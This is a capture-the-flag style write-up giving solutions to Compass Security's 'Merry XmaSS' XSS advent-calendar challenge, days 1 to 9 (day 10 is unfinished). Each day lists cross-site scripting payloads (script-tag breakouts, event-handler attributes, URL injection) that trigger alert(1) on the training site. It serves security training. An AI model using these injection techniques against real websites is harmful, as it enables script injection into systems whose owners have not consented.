# Merry XmaSS – XSS advent calendar 2021

Find the challenge hosted by [Compass Security](https://www.compass-security.com/de/) here: https://xmass.compass-demo.com/

Use your XSS skills to pop up *alert(1)* windows on every day.

**SPOILER ALERT!** Stop reading here, if you want to solve the challenges yourself.

---

These are some solutions I was able to find, I am sure there are many more.

**+++ Day 1 +++**  
https://xmass.compass-demo.com/level1
```
<script>alert(1)</script>
```
**+++ Day 2 +++**  
https://xmass.compass-demo.com/level2
```
a"><script>alert(1)</script
```
alternative solution (*user interaction required*)
```
a" onfocus="alert(1)"
```
**+++ Day 3 +++**  
https://xmass.compass-demo.com/level3
```
"><script>alert(1)</script>
```
**+++ Day 4 +++**  
https://xmass.compass-demo.com/level4
```
a";alert(1);"
```
**+++ Day 5 +++**  
https://xmass.compass-demo.com/level5
```
a</textarea><script>alert(1)</script>
```
**+++ Day 6 +++**  
https://xmass.compass-demo.com/level6
```
<img src="#" onerror="alert(1)"/>
```
**+++ Day 7 +++**  
https://xmass.compass-demo.com/level7 *(use URL below to get the alert window)*
```
https://xmass.compass-demo.com/level7?inject=<script>alert(1)</script>
```
**+++ Day 8 +++**  
https://xmass.compass-demo.com/level8
```
" autofocus onfocus="alert(1)
```
alternativ solution *(mouse cursor has to be in the 'conent area' of the browser)*
```
" onmouseover="alert(1)" style="display: block; position: fixed; top: 0; left: 0; z-index: 99999; width: 9999px; height: 9999px; (mouse cursor musst be on content area of browser window)
```
**+++ Day 9 +++**  
https://xmass.compass-demo.com/level9
```
<img src="#" onerror="alert(1)"/>
```
**+++ Day 10 +++**  
https://xmass.compass-demo.com/level10
```
tbc
```